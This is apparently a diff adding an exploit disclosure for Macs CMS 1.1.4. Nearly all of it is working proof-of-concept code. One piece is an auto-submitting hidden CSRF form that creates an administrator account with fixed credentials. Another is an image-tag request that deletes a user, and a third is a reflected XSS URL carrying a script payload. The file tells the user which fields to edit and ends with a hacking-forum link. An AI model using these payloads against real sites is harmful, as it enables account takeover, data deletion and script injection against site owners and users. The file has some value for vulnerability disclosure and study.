@@ -1,0 +1,39 @@
+<!---
+    Title: Macs CMS 1.1.4 Multiple Vulnerabilities (XSS/CSRF)
+    Author: 10n1z3d <10n1z3d[at]w[dot]cn>
+    Date: Sun 11 Jul 2010 11:53:35 AM EEST 
+    Vendor: http://macs-framework.sourceforge.net/
+    Download: http://sourceforge.net/projects/macs-framework/
+--->
+
+-=[ CSRF PoC 1 - Create Admin User ]=-
+    
+    <html>
+        <head>
+            <title>Macs CMS 1.1.4 Multiple Vulnerabilities (XSS/CSRF) - Create Admin User</title>
+        </head>
+        <body onload="document.csrf.submit();">
+                <!--- Edit these --->
+            <form name="csrf" action="http://[domain]/index.php/main/cms/saveUser" method="post">
+                <input type="hidden" name="ajaxRequest" value="true" />
+                <input type="hidden" name="username" value="root" />
+                <input type="hidden" name="password" value="rootroot"/>
+                <input type="hidden" name="confirmPassword" value="rootroot" />
+                <input type="hidden" name="emailAddress" value="root@root.com" />
+                <!--- Do not edit below --->
+                <input type="hidden" name="roleId" value="1" />
+            </form>
+        </body>
+    </html>
+    
+-=[ CSRF PoC 2 - Delete User ]=-
+    <img src='http://[domain]/index.php/main/cms/deleteUser?userId=2' />
+    
+-=[ XSS PoC ]=-
+    http://[domain]/index.php/footer/search?searchString='><script>alert('xss')</script>
+    
+<!---
+    http://www.evilzone.org/
+    irc.evilzone.org  (6697 / 9999)
+--->
+
